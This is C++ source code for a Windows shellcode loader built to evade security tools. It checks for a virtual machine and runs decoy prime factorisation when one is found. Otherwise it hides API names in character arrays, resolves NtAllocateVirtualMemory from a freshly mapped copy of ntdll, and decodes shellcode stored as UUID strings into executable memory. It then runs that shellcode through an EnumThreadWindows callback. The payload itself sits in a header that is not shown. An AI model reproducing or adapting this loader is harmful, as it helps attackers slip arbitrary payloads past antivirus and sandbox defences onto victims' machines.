#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include "shell.h"
#include "Calc.h"
#include "VMCheck.h"


#pragma comment(lib, "Rpcrt4.lib")


#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);



typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG   FreeType
);

    


FARPROC WINAPI GetProcAddressR(HANDLE hModule, LPCSTR lpProcName)
{
    UINT_PTR uiLibraryAddress = 0;
    FARPROC fpResult = NULL;

    if (hModule == NULL)
        return NULL;
    uiLibraryAddress = (UINT_PTR)hModule;

    __try
    {
        UINT_PTR uiAddressArray = 0;
        UINT_PTR uiNameArray = 0;
        UINT_PTR uiNameOrdinals = 0;
        PIMAGE_NT_HEADERS pNtHeaders = NULL;
        PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
        PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
        pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);
        pDataDirectory = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + pDataDirectory->VirtualAddress);
        uiAddressArray = (uiLibraryAddress + pExportDirectory->AddressOfFunctions);
        uiNameArray = (uiLibraryAddress + pExportDirectory->AddressOfNames);
        uiNameOrdinals = (uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);
        if (((DWORD)lpProcName & 0xFFFF0000) == 0x00000000)
        {
            uiAddressArray += ((IMAGE_ORDINAL((DWORD)lpProcName) - pExportDirectory->Base) * sizeof(DWORD));
            fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));
        }
        else
        {
            DWORD dwCounter = pExportDirectory->NumberOfNames;
            while (dwCounter--)
            {
                char* cpExportedFunctionName = (char*)(uiLibraryAddress + DEREF_32(uiNameArray));
                if (strcmp(cpExportedFunctionName, lpProcName) == 0)
                {
                    uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
                    fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));

                    break;
                }
                uiNameArray += sizeof(DWORD);
                uiNameOrdinals += sizeof(WORD);
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        fpResult = NULL;
    }

    return fpResult;
}



int main(int args,char* argv[])
{

    if (checkVM(args, argv)) {


        char str1[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
        char str2[] = { 'c',':','\\','\\','w','i','n','d','o','w','s','\\','\\','s','y','s','t','e','m','3','2','\\','\\','n','t','d','l','l','.','d','l','l','\0' };
        char str3[] = { 'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
        HANDLE hNtdllfile = CreateFileA(str2, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE hNtdllMapping = CreateFileMapping(hNtdllfile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID lpNtdllmaping = MapViewOfFile(hNtdllMapping, FILE_MAP_READ, 0, 0, 0);

        pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddressR((HMODULE)lpNtdllmaping, str1);
        pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProcAddressR((HMODULE)lpNtdllmaping, str3);

        int err = GetLastError();

        LPVOID lpMem = nullptr;
        SIZE_T uSize = 0x90000;

        NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &lpMem, 0, &uSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


        DWORD_PTR hptr = (DWORD_PTR)lpMem;
        int elems = sizeof(shellcode) / sizeof(shellcode[0]);



        for (int i = 0; i < elems; i++) {
            UUID uuid;
            status = UuidFromStringA((RPC_CSTR)shellcode[i], &uuid);
            if (status != RPC_S_OK) {
                NtFreeVirtualMemory(GetCurrentProcess(), &lpMem, &uSize, MEM_RELEASE);
                return -1;
            }
            memcpy((LPVOID)hptr, &uuid, sizeof(UUID));
            hptr += sizeof(UUID);
        }

        EnumThreadWindows(0, (WNDENUMPROC)lpMem, 0);
    }
    else {
        prime_factorization(generate_random_64bit_number(), 100);
    };

  
    return 0;
}